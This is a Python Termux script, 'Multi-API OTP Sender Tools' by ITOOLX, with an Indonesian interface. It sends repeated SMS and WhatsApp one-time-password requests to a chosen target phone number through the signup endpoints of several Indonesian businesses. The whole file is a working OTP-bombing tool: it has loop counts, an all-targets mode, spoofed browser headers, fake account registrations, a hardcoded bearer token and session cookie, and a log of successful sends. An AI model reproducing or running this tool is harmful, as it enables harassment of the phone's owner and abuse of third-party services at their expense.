#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TextColumn, TimeRemainingColumn)
    from rich.align import Align
    from rich.live import Live
    from rich.text import Text
    from rich import box
    from rich.rule import Rule
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TextColumn, TimeRemainingColumn)
    from rich.align import Align
    from rich.live import Live
    from rich.text import Text
    from rich import box
    from rich.rule import Rule

console = Console()

# ══════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════
# { phone: { method_key: float(sent_at) } }
cooldown_tracker: dict = {}

# [ { no, time, phone, api, icon, status, preview } ]
success_log: list = []
_log_no = [0]   # mutable counter

# ══════════════════════════════════════════════════════
#  API CONFIGS
# ══════════════════════════════════════════════════════
APIS = {
    1: {"name": "Bunda.co.id",        "desc": "OTP via SMS",          "icon": "📱",
        "cooldown": 120, "color": "bright_magenta", "method": "bunda"},
    2: {"name": "OptikMelawai",        "desc": "OTP via Register SMS", "icon": "👓",
        "cooldown": 60,  "color": "bright_blue",    "method": "optik"},
    3: {"name": "Paper.id (SMS)",      "desc": "OTP via SMS",          "icon": "📄",
        "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
    4: {"name": "Paper.id (WhatsApp)", "desc": "OTP via WhatsApp",     "icon": "💬",
        "cooldown": 30,  "color": "bright_yellow",  "method": "paper_wa"},
    5: {"name": "PlanetBan",           "desc": "OTP via WhatsApp",     "icon": "🏪",
        "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
    6: {"name": "ALL TARGETS",         "desc": "Kirim ke semua API",   "icon": "⚡",
        "cooldown": 120, "color": "bold cyan",      "method": "all"},
}

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36")

BANNER = """[bold cyan]
 ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
[/bold cyan]"""

# ══════════════════════════════════════════════════════
#  COOLDOWN HELPERS
# ══════════════════════════════════════════════════════

def get_remaining(phone: str, method: str, cooldown: int) -> int:
    sent = cooldown_tracker.get(phone, {}).get(method)
    if sent is None:
        return 0
    return max(0, int(cooldown - (time.time() - sent)))

def set_cooldown(phone: str, method: str):
    cooldown_tracker.setdefault(phone, {})[method] = time.time()

def fmt_secs(s: int) -> str:
    m, sc = divmod(s, 60)
    return f"{m}m {sc:02d}s" if m else f"{sc}s"

def bar_str(rem: int, total: int, width: int = 14) -> str:
    """Return a simple ASCII progress bar string."""
    if total == 0:
        return "█" * width
    filled = int((total - rem) / total * width)
    return "█" * filled + "░" * (width - filled)

# ══════════════════════════════════════════════════════
#  SUCCESS LOG HELPERS
# ══════════════════════════════════════════════════════

def log_success(phone: str, api_name: str, icon: str,
                status: int, body: str):
    _log_no[0] += 1
    success_log.append({
        "no":      _log_no[0],
        "time":    datetime.now().strftime("%H:%M:%S"),
        "date":    datetime.now().strftime("%d/%m"),
        "phone":   phone,
        "api":     api_name,
        "icon":    icon,
        "status":  status,
        "preview": (body[:80].replace("\n", " ") +
                    ("…" if len(body) > 80 else "")),
    })

def is_success(code: int) -> bool:
    return code in (200, 201, 202)

# ══════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════

def send_bunda(phone: str) -> dict:
    try:
        r = requests.post(
            "https://cms.bunda.co.id/api/v1/auth/send-otp",
            data=json.dumps({"phone_number": int(phone), "type": "auth"}),
            headers={
                "User-Agent": UA, "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json", "x-locale": "id",
                "sec-ch-ua-platform": '"Android"', "sec-ch-ua-mobile": "?1",
                "origin": "https://www.bunda.co.id",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://www.bunda.co.id/id/hospitals",
                "accept-language": "id-ID,id;q=0.9",
                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
            }, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_optik(phone: str) -> dict:
    try:
        r = requests.post(
            "https://api.optikmelawai.com/api/v3/auth/register/1",
            files=[("name",(None,"Jonuis Dane")),("sex",(None,"1")),
                   ("birth_date",(None,"1995-07-28")),("mobile_number",(None,phone)),
                   ("password",(None,"Pangkey2005?")),("repassword",(None,"Pangkey2005?"))],
            headers={
                "User-Agent": UA, "Accept": "application/json, text/plain, */*",
                "language": "id", "sec-ch-ua-platform": '"Android"',
                "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
                "x-unique-user": "GA1.1.883509241.1785170487",
                "sec-ch-ua-mobile": "?1", "origin": "https://optikmelawai.com",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://optikmelawai.com/",
                "accept-language": "id-ID,id;q=0.9",
                "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC",
                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
            }, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_paper(phone: str, method: str = "sms") -> dict:
    try:
        r = requests.post(
            "https://register.paper.id/api/v1/auth/register/send-otp",
            data=json.dumps({"phone": phone, "method": method,
                             "registered_by": "flutter mweb"}),
            headers={
                "User-Agent": UA, "Content-Type": "application/json",
                "sec-ch-ua-platform": '"Android"', "authorization": "",
                "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
                "sec-ch-ua-mobile": "?1", "origin": "https://paper.id",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://paper.id/", "accept-language": "id-ID,id;q=0.9",
                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
            }, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_planetban(phone: str) -> dict:
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb  = "0" + num[2:]
    try:
        r = requests.post(
            "https://api.planetban.com/website/customer/request-otp",
            data=json.dumps({"phone": pb, "purpose": "register",
                             "method": "whatsapp"}),
            headers={
                "User-Agent": UA, "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "sec-ch-ua-platform": '"Android"', "sec-ch-ua-mobile": "?1",
                "origin": "https://planetban.com",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://planetban.com/",
                "accept-language": "id-ID,id;q=0.9",
                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
            }, timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def dispatch(method: str, phone: str) -> dict:
    if method == "bunda":     return send_bunda(phone)
    if method == "optik":     return send_optik(phone)
    if method == "paper_sms": return send_paper(phone, "sms")
    if method == "paper_wa":  return send_paper(phone, "whatsapp")
    if method == "planetban": return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════════════

def status_color(code: int) -> str:
    if code in (200, 201, 202): return "bold green"
    if code == 0:               return "bold red"
    if code >= 400:             return "bold red"
    return "bold yellow"

def result_icon(code: int) -> str:
    if code in (200, 201, 202): return "✅"
    if code == 0:               return "❌"
    return "⚠️"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def print_banner():
    console.print(BANNER)
    console.print(Align.center(Panel(
        "[bold white]Multi-API OTP Sender Tools[/bold white]\n"
        "[dim]by [bold cyan]ITOOLX[/bold cyan] · Termux Edition[/dim]",
        border_style="cyan", padding=(0, 4),
    )))
    console.print()

# ══════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════

def print_menu(phone: str = ""):
    table = Table(
        title="[bold cyan]⚡ PILIH TARGET API ⚡[/bold cyan]",
        box=box.DOUBLE_EDGE, border_style="cyan",
        header_style="bold cyan", show_lines=True, min_width=52,
    )
    table.add_column("No",     style="bold white", justify="center", width=4)
    table.add_column("",       justify="center",   width=3)
    table.add_column("Target", style="bold",        width=22)
    table.add_column("Mode",   width=22)
    table.add_column("CD",     justify="center",    width=9)

    for num, api in APIS.items():
        if phone and api["method"] != "all":
            rem = get_remaining(phone, api["method"], api["cooldown"])
            cd_txt = (f"[bold red]{fmt_secs(rem)}[/bold red]"
                      if rem > 0
                      else f"[bold yellow]{api['cooldown']}s[/bold yellow]")
        else:
            cd_txt = f"[bold yellow]{api['cooldown']}s[/bold yellow]"

        table.add_row(
            f"[bold cyan]{num}[/bold cyan]",
            api["icon"],
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]",
            cd_txt,
        )

    table.add_row("[bold green]7[/bold green]", "📊",
                  "[bold green]History Sukses[/bold green]",
                  f"[dim]{len(success_log)} item tersimpan[/dim]", "-")
    table.add_row("[bold yellow]8[/bold yellow]", "⏱",
                  "[bold yellow]Live Cooldown[/bold yellow]",
                  "[dim]Realtime hitung mundur[/dim]", "-")
    table.add_row("[bold red]0[/bold red]", "🚪",
                  "[bold red]EXIT[/bold red]",
                  "[dim]Keluar dari program[/dim]", "-")

    console.print(Align.center(table))
    if phone:
        console.print(Align.center(
            f"[dim]Nomor aktif → [bold bright_yellow]{phone}[/bold bright_yellow][/dim]"
        ))
    console.print()

# ══════════════════════════════════════════════════════
#  LIVE COOLDOWN VIEW  (realtime, refresh per detik)
# ══════════════════════════════════════════════════════

def _build_live_cd_table() -> Table:
    """Build the live-updating cooldown table."""
    now = datetime.now().strftime("%H:%M:%S")
    table = Table(
        title=f"[bold cyan]⏱  REALTIME COOLDOWN  [/bold cyan][dim]({now})[/dim]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    table.add_column("Nomor",        width=16, style="bright_yellow")
    table.add_column("API",          width=22)
    table.add_column("Progress",     width=18)
    table.add_column("Sisa",         width=9, justify="right")
    table.add_column("Unlock",       width=10, justify="center")
    table.add_column("Status",       width=12, justify="center")

    if not cooldown_tracker:
        table.add_row(
            "[dim]─[/dim]", "[dim]Belum ada data cooldown[/dim]",
            "", "", "", "",
        )
        return table

    for phone, methods in cooldown_tracker.items():
        first = True
        for api in APIS.values():
            if api["method"] == "all":
                continue
            method = api["method"]
            if method not in methods:
                continue

            rem   = get_remaining(phone, method, api["cooldown"])
            total = api["cooldown"]
            sent  = methods[method]

            # progress bar visual
            if rem > 0:
                filled  = int((total - rem) / total * 14)
                bar_vis = (
                    f"[bold cyan]{'█' * filled}[/bold cyan]"
                    f"[dim]{'░' * (14 - filled)}[/dim]"
                )
                sisa_txt   = f"[bold red]{fmt_secs(rem)}[/bold red]"
                unlock_txt = datetime.fromtimestamp(
                    sent + total).strftime("%H:%M:%S")
                stat_txt   = "[bold red]🔒 LOCKED[/bold red]"
            else:
                bar_vis    = f"[bold green]{'█' * 14}[/bold green]"
                sisa_txt   = "[bold green]-[/bold green]"
                unlock_txt = "[dim]-[/dim]"
                stat_txt   = "[bold green]🔓 READY[/bold green]"

            phone_cell = (
                f"[bright_yellow]{phone}[/bright_yellow]" if first else ""
            )
            table.add_row(
                phone_cell,
                f"{api['icon']} [{api['color']}]{api['name']}[/{api['color']}]",
                bar_vis,
                sisa_txt,
                unlock_txt,
                stat_txt,
            )
            first = False

    return table


def view_live_cooldown():
    """Full-screen live cooldown panel, Ctrl+C / Enter to exit."""
    clear()
    console.print(BANNER)
    console.print(Align.center(
        "[dim]Tekan [bold]Ctrl+C[/bold] atau [bold]Enter[/bold] untuk kembali ke menu[/dim]\n"
    ))

    # We run live refresh in a background-style loop using Live
    try:
        with Live(
            _build_live_cd_table(),
            console=console,
            refresh_per_second=1,
            screen=False,
        ) as live:
            while True:
                time.sleep(1)
                live.update(_build_live_cd_table())
    except KeyboardInterrupt:
        pass

# ══════════════════════════════════════════════════════
#  SUCCESS LOG VIEW
# ══════════════════════════════════════════════════════

def view_success_log():
    clear()
    console.print(BANNER)

    if not success_log:
        console.print(Align.center(Panel(
            "[bold yellow]📭  Belum ada pengiriman sukses.[/bold yellow]",
            border_style="yellow", padding=(1, 4),
        )))
        console.print()
        Prompt.ask("[bold cyan]  ❯[/bold cyan] Enter untuk kembali", default="")
        return

    table = Table(
        title=f"[bold green]📊 HISTORY SUKSES  ({len(success_log)} item)[/bold green]",
        box=box.ROUNDED, border_style="green",
        header_style="bold green", show_lines=True,
    )
    table.add_column("#",       width=4,  justify="right",  style="bold white")
    table.add_column("Tgl",     width=6,  justify="center", style="dim")
    table.add_column("Jam",     width=9,  justify="center", style="dim")
    table.add_column("Nomor",   width=15, style="bold bright_yellow")
    table.add_column("API",     width=22)
    table.add_column("HTTP",    width=6,  justify="center")
    table.add_column("Preview", width=34, style="dim")

    for entry in reversed(success_log):   # terbaru di atas
        code  = entry["status"]
        color = status_color(code)
        table.add_row(
            str(entry["no"]),
            entry["date"],
            entry["time"],
            entry["phone"],
            f"{entry['icon']} {entry['api']}",
            f"[{color}]{code}[/{color}]",
            entry["preview"],
        )

    console.print(Align.center(table))
    console.print()

    # Summary box
    total   = len(success_log)
    phones  = len({e["phone"] for e in success_log})
    apis    = len({e["api"] for e in success_log})
    console.print(Align.center(Panel(
        f"[bold white]Total sukses :[/bold white] [bold green]{total}[/bold green]   "
        f"[bold white]Nomor unik :[/bold white] [bold yellow]{phones}[/bold yellow]   "
        f"[bold white]API dipakai:[/bold white] [bold cyan]{apis}[/bold cyan]",
        border_style="green", padding=(0, 2),
    )))
    console.print()
    Prompt.ask("[bold cyan]  ❯[/bold cyan] Enter untuk kembali", default="")

# ══════════════════════════════════════════════════════
#  COUNTDOWN BAR  (blocking, saat tunggu cooldown)
# ══════════════════════════════════════════════════════

def countdown(seconds: int, label: str = "Cooldown"):
    with Progress(
        SpinnerColumn(spinner_name="dots", style="bold cyan"),
        TextColumn(f"[bold yellow]{label}"),
        BarColumn(bar_width=26, style="cyan", complete_style="bright_cyan"),
        TextColumn("[bold white]{task.percentage:>3.0f}%"),
        TimeRemainingColumn(),
        console=console, transient=True,
    ) as prog:
        task = prog.add_task("", total=seconds)
        for _ in range(seconds):
            time.sleep(1)
            prog.advance(task, 1)

# ══════════════════════════════════════════════════════
#  RESULT PANELS
# ══════════════════════════════════════════════════════

def print_result_panel(api_cfg: dict, phone: str, result: dict,
                       loop: int, total: int):
    code    = result.get("status", 0)
    body    = result.get("body", "")
    icon    = result_icon(code)
    color   = status_color(code)
    preview = body[:100].replace("\n", " ") + ("…" if len(body) > 100 else "")

    if is_success(code):
        log_success(phone, api_cfg["name"], api_cfg["icon"], code, body)
        extra = "[bold green]  ✅ Disimpan ke History Sukses[/bold green]"
    else:
        extra = ""

    console.print(Panel(
        f"[bold white]Target   :[/bold white] [cyan]{api_cfg['name']}[/cyan]\n"
        f"[bold white]Phone    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"[bold white]HTTP     :[/bold white] [{color}]{code}[/{color}]\n"
        f"[bold white]Round    :[/bold white] [white]{loop}/{total}[/white]\n"
        f"[bold white]Time     :[/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n"
        f"[bold white]Response :[/bold white] [dim]{preview}[/dim]"
        + (f"\n{extra}" if extra else ""),
        title=f"[bold]{icon} RESULT[/bold]",
        border_style=color.split()[-1] if "bold" in color else color,
        padding=(1, 2),
    ))


def print_all_results(phone: str, results: list, loop: int, total: int):
    table = Table(
        title=f"[bold cyan]⚡ ALL TARGETS — Round {loop}/{total}[/bold cyan]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    table.add_column("",       justify="center", width=3)
    table.add_column("Target", width=22)
    table.add_column("HTTP",   justify="center", width=6)
    table.add_column("Status", width=10)
    table.add_column("Jam",    width=10)

    for item in results:
        code  = item["status"]
        color = status_color(code)
        stxt  = "SUCCESS" if is_success(code) else ("ERROR" if code == 0 else "FAILED")
        table.add_row(
            item["icon"], f"[bold]{item['name']}[/bold]",
            f"[{color}]{code}[/{color}]",
            f"[{color}]{stxt}[/{color}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print(Align.center(table))

# ══════════════════════════════════════════════════════
#  COOLDOWN GATE  (cek & tunggu sebelum kirim)
# ══════════════════════════════════════════════════════

def gate_cooldown(phone: str, methods: list) -> bool:
    """
    Check cooldown for list of (api_cfg) items.
    Returns True if we can proceed, False if user cancelled.
    """
    locked = []
    for api in methods:
        rem = get_remaining(phone, api["method"], api["cooldown"])
        if rem > 0:
            locked.append((api, rem))

    if not locked:
        return True

    max_rem = max(r for _, r in locked)

    rows = "\n".join(
        f"  {a['icon']} [cyan]{a['name']}[/cyan] → "
        f"[bold red]{fmt_secs(r)}[/bold red]  "
        f"[dim](unlock {datetime.fromtimestamp(cooldown_tracker[phone][a['method']] + a['cooldown']).strftime('%H:%M:%S')})[/dim]"
        for a, r in locked
    )
    console.print(Panel(
        f"[bold white]Nomor  :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n\n"
        + rows,
        title="[bold red]🔒 COOLDOWN AKTIF[/bold red]",
        border_style="red", padding=(1, 2),
    ))

    try:
        pilih = Prompt.ask(
            "[bold cyan]  ❯[/bold cyan] Tunggu cooldown selesai? [dim](y/n)[/dim]",
            choices=["y", "n"], default="y",
        )
    except (KeyboardInterrupt, EOFError):
        return False

    if pilih != "y":
        console.print("[bold yellow]  ✗ Pengiriman dibatalkan.[/bold yellow]")
        return False

    countdown(max_rem, f"⏳ Menunggu  {fmt_secs(max_rem)}")
    return True

# ══════════════════════════════════════════════════════
#  RUNNERS
# ══════════════════════════════════════════════════════

def run_single(api_cfg: dict, phone: str, loop_count: int):
    method = api_cfg["method"]
    cd     = api_cfg["cooldown"]

    for i in range(1, loop_count + 1):
        if not gate_cooldown(phone, [api_cfg]):
            return

        console.print(Rule(f"[bold cyan] Round {i}/{loop_count} [/bold cyan]"))
        with console.status(
            f"[bold cyan]Mengirim ke [bright_yellow]{api_cfg['name']}[/bright_yellow]...",
            spinner="dots",
        ):
            result = dispatch(method, phone)

        set_cooldown(phone, method)
        print_result_panel(api_cfg, phone, result, i, loop_count)

        if i < loop_count:
            countdown(cd, f"⏳ Cooldown  {cd}s")


def run_all(phone: str, loop_count: int):
    targets = [v for v in APIS.values() if v["method"] != "all"]
    max_cd  = max(v["cooldown"] for v in targets)

    for i in range(1, loop_count + 1):
        if not gate_cooldown(phone, targets):
            return

        console.print(Rule(f"[bold cyan] ⚡ ALL TARGETS — Round {i}/{loop_count} [/bold cyan]"))
        results = []
        for api in targets:
            with console.status(
                f"[bold cyan]Sending → [bright_yellow]{api['name']}[/bright_yellow]...",
                spinner="aesthetic",
            ):
                t   = datetime.now().strftime("%H:%M:%S")
                res = dispatch(api["method"], phone)
                set_cooldown(phone, api["method"])
                if is_success(res.get("status", 0)):
                    log_success(phone, api["name"], api["icon"],
                                res["status"], res.get("body", ""))
                results.append({
                    "name": api["name"], "icon": api["icon"],
                    "status": res.get("status", 0),
                    "body":   res.get("body", ""), "time": t,
                })
            time.sleep(0.3)

        print_all_results(phone, results, i, loop_count)

        if i < loop_count:
            countdown(max_cd, f"⏳ Cooldown  {max_cd}s")

# ══════════════════════════════════════════════════════
#  INPUT HELPERS
# ══════════════════════════════════════════════════════

def ask_phone(current: str = "") -> str:
    hint = (f" [dim](Enter = {current})[/dim]" if current
            else " [dim](08xxx / 628xxx)[/dim]")
    while True:
        try:
            raw = Prompt.ask(f"[bold cyan]  ❯[/bold cyan] Nomor target{hint}")
            if raw.strip() == "" and current:
                return current
            p = validate_phone(raw)
            if len(p) >= 10:
                return p
            console.print("[bold red]  ✗ Nomor tidak valid![/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print()
            sys.exit(0)

# ══════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════

def main():
    clear()
    print_banner()
    current_phone = ""

    while True:
        print_menu(current_phone)

        # ── Input pilihan ────────────────────────────────────────────
        try:
            raw = Prompt.ask("[bold cyan]  ❯[/bold cyan] Pilih [dim](0=exit, 7=history, 8=live CD)[/dim]")
            choice = int(raw.strip())
        except (ValueError, KeyboardInterrupt, EOFError):
            console.print("[bold red]  ✗ Input tidak valid.[/bold red]")
            time.sleep(0.6)
            clear(); print_banner(); continue

        # ── Exit ─────────────────────────────────────────────────────
        if choice == 0:
            console.print(Align.center(Panel(
                "[bold red]👋 Sampai jumpa![/bold red]\n[dim]ITOOLX · Termux Edition[/dim]",
                border_style="red", padding=(1, 4),
            )))
            sys.exit(0)

        # ── History sukses ───────────────────────────────────────────
        if choice == 7:
            view_success_log()
            clear(); print_banner(); continue

        # ── Live cooldown ────────────────────────────────────────────
        if choice == 8:
            view_live_cooldown()
            clear(); print_banner(); continue

        # ── Validasi pilihan API ─────────────────────────────────────
        if choice not in APIS:
            console.print("[bold red]  ✗ Pilihan tidak valid![/bold red]")
            time.sleep(0.6)
            clear(); print_banner(); continue

        api_cfg = APIS[choice]
        console.print(
            f"\n  [bold white]Target  :[/bold white] "
            f"[{api_cfg['color']}]{api_cfg['icon']} {api_cfg['name']}[/{api_cfg['color']}]"
        )

        # ── Nomor ────────────────────────────────────────────────────
        current_phone = ask_phone(current_phone)
        console.print(f"  [bold white]Phone   :[/bold white] [bright_yellow]{current_phone}[/bright_yellow]")

        # ── Jumlah round ─────────────────────────────────────────────
        try:
            loop_count = IntPrompt.ask(
                "[bold cyan]  ❯[/bold cyan] Jumlah pengiriman", default=1)
            if loop_count < 1:
                raise ValueError
        except (KeyboardInterrupt, EOFError, ValueError):
            console.print("[bold red]  ✗ Minimal 1![/bold red]")
            time.sleep(0.6); clear(); print_banner(); continue

        # ── Konfirmasi ───────────────────────────────────────────────
        console.print()
        console.print(Panel(
            f"[bold white]Target  :[/bold white] [{api_cfg['color']}]{api_cfg['icon']} "
            f"{api_cfg['name']}[/{api_cfg['color']}]\n"
            f"[bold white]Phone   :[/bold white] [bright_yellow]{current_phone}[/bright_yellow]\n"
            f"[bold white]Round   :[/bold white] [white]{loop_count}x[/white]\n"
            f"[bold white]Cooldown:[/bold white] [bold yellow]{api_cfg['cooldown']}s[/bold yellow]",
            title="[bold cyan]📋 KONFIRMASI[/bold cyan]",
            border_style="cyan", padding=(1, 2),
        ))

        try:
            confirm = Prompt.ask(
                "[bold cyan]  ❯[/bold cyan] Lanjut?",
                choices=["y", "n"], default="y")
        except (KeyboardInterrupt, EOFError):
            confirm = "n"

        if confirm != "y":
            console.print("[bold yellow]  ✗ Dibatalkan.[/bold yellow]")
            time.sleep(0.6); clear(); print_banner(); continue

        # ── Kirim ────────────────────────────────────────────────────
        console.print()
        try:
            if api_cfg["method"] == "all":
                run_all(current_phone, loop_count)
            else:
                run_single(api_cfg, current_phone, loop_count)
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Dihentikan.[/bold red]")

        # ── Kembali ke menu ──────────────────────────────────────────
        console.print()
        console.print(Align.center(Panel(
            f"[bold green]✅ SELESAI![/bold green]   "
            f"[dim]History sukses: {len(success_log)} item[/dim]",
            border_style="green", padding=(0, 4),
        )))
        time.sleep(1.5)
        clear(); print_banner()


if __name__ == "__main__":
    main()
